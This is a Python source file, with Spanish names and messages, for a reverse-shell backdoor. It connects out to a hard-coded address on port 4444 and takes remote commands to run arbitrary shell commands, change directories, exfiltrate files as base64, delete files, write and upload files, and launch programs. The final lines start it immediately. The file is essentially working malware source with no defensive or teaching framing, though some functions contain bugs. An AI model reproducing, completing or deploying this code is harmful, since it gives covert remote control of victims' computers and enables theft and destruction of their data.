from cgitb import text
import socket
import subprocess
import json
import os
import platform
import base64
from os import remove
from os import path

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        sistema = platform.system()
        self.reliable_send(sistema)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def reliable_recieve(self):
        data = b''
        while True:
            try:
                json_data = self.connection.recv(4096)
                data += json_data
                if len(json_data) < 4096:
                    break
            except ValueError:
                continue
        return json.loads(data)
    
    def ejecutar_comando(self, command):
        return subprocess.check_output(command, shell=True)
    
    def cambiar_directorio(self, ruta):
        if path.exists(ruta):
            os.chdir(ruta)
            return "[+] Entrando a " + ruta
        else:
            return "[x] La carpeta " + ruta + " no existe"
    
    def leer_archivo(self, ruta):
        if path.exists(ruta):
            with open(ruta, "rb") as file:
                return base64.b64encode(file.read())
        else:
            return "[x] El archivo " + ruta + " no existe"
    
    def eliminar_archivo(self, ruta):
        if path.exists(ruta):
            remove(ruta)
            return "[+] El archivo " + ruta + " a sido eliminado"
        else:
            return "[x] El archivo " + ruta + " no existe"

    def leer_texto(self, ruta):
        if path.exists(ruta):
            texto = ""
            f = open(path, "r")
            for linea in f:
                texto += linea
            f.close()
            return texto
        else:
            return "[x] El archivo " + ruta + " no existe"
    
    def escribir_texto(self, nombre, texto):
        with open(nombre, 'w') as f:
            f.write(texto)
        return "[+] Archivo " + nombre + " creado correctamente"
    
    def run_file(self, archivo):
        if path.exists(archivo):
            if platform.system() == "Darwin":
                subprocess.call(('open', archivo))
            elif platform.system() == "Windows":
                os.startfile(archivo)
            elif platform.system() == "Linux":
                subprocess.call(('xdg-open', archivo))

            return "[+] Programa abierto correctamente"
        else:
            return "[x] El elemento " + archivo + " no existe"

    def escribir_archivo(self, path):
        content = self.reliable_recieve()
        print(content)
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Carga completa de " + path

    def run(self):
        while True:
            command = self.reliable_recieve()
            if(command[0] == "exit"):
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command)>1:
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]
                    
                resultados_comando = self.cambiar_directorio(ruta)
            elif command[0] == "download":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]

                resultados_comando = self.leer_archivo(ruta)
            elif command[0] == "del":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]

                resultados_comando = self.eliminar_archivo(ruta)
            elif command[0] == "read":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]

                resultados_comando = self.leer_texto(ruta)
            elif command[0] == "write":
                texto = ""
                for i in range(2, (len(command))):
                    if i>2:
                        texto += " " + command[i]
                    else: 
                        texto += command[i]
                resultados_comando = self.escribir_texto(command[1], texto)
            elif command[0] == "run":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]
                resultados_comando = self.run_file(ruta)
            elif command[0] == "send":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]
                resultados_comando = self.escribir_archivo(ruta)
            else:
                resultados_comando = self.ejecutar_comando(command)
            
            self.reliable_send(resultados_comando)

puerta = Backdoor("192.168.1.186", 4444)
puerta.run()